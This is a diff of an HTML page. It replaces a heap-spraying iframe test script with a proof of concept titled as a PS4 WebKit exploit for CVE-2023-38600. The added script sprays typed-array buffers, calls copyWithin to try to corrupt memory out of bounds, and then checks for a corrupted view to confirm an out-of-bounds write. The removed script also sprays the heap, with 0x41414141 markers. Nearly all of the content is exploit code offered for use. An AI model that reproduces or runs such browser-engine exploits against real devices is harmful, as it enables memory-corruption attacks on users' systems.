@@ -1,44 +1,86 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <script>
-        async function trigger() {
-            let spray = [];
-            console.log("Starting test...");
-            for (let i = 0; i < 10; i++) {
-                try {
-                    let frame = document.createElement("iframe");
-                    frame.srcdoc = `
-                        <script>
-                            try {
-                                window.performance = window.performance || {};
-                                performance.setResourceUsageOverlayVisible = performance.setResourceUsageOverlayVisible || function(visible) {
-                                    console.log("Tried to set overlay visible: " + visible);
-                                };
-                                performance.setResourceUsageOverlayVisible(true);
-                                setTimeout(() => parent.document.getElementById("frame").remove(), 100);
-                            } catch (e) {
-                                parent.console.log("Error in iframe:", e);
-                            }
-                        </script>
-                    `;
-                    frame.id = "frame";
-                    document.body.appendChild(frame);
-                    await new Promise(resolve => setTimeout(resolve, 300));
-                    frame.remove();
-                    spray.push({ ptr: new Array(64).fill(0x41414141), data: new Array(64).fill("test") });
-                } catch (e) {
-                    console.log("Error:", e);
-                }
-                let largeObject = new Array(250000).fill(0);
-                largeObject = null;
-            }
-            spray = null;
-            console.log("Test complete");
-        }
-    </script>
+  <meta charset="utf-8">
+  <title>PS4 WebKit Exploit - CVE-2023-38600</title>
+  <style>
+    body {
+      font-family: monospace;
+      background: #111;
+      color: #0f0;
+      padding: 20px;
+    }
+    button {
+      background: #222;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0f0;
+      color: #111;
+    }
+  </style>
 </head>
 <body>
-    <button id="test" onclick="trigger()">test</button>
+  <h1>PS4 WebKit Exploit PoC - CVE-2023-38600</h1>
+  <button onclick="runExploit()">Run Exploit</button>
+  <div id="log" style="margin-top: 20px;"></div>
+
+  <script>
+    function log(msg) {
+      let div = document.createElement("div");
+      div.textContent = msg;
+      document.getElementById("log").appendChild(div);
+    }
+
+    function runExploit() {
+      log("[*] Exploit started");
+
+      let victimBuffers = [];
+      let victimViews = [];
+      for (let i = 0; i < 1000; i++) {
+        let buf = new ArrayBuffer(0x100);
+        let view = new Float64Array(buf);
+        view[0] = 13.37;
+        victimBuffers.push(buf);
+        victimViews.push(view);
+      }
+      log("[+] Heap prepared");
+
+      let corruptor = new Float64Array(10);
+
+      try {
+        corruptor.copyWithin(0, 100);
+        log("[+] copyWithin executed");
+      } catch (e) {
+        log("[-] copyWithin failed: " + e);
+        return;
+      }
+
+      let corruptedIndex = -1;
+      for (let i = 0; i < victimViews.length; i++) {
+        if (victimViews[i][0] !== 13.37) {
+          corruptedIndex = i;
+          log("[!] Corrupted object found at index: " + i);
+          break;
+        }
+      }
+
+      if (corruptedIndex === -1) {
+        log("[-] No corrupted object found. Try again.");
+      } else {
+        let corrupted = victimViews[corruptedIndex];
+        corrupted[0] = 42.42;
+        if (corrupted[0] === 42.42) {
+          log("[+] OOB write confirmed");
+        } else {
+          log("[-] Corrupted object is not writable");
+        }
+      }
+    }
+  </script>
 </body>
 </html>
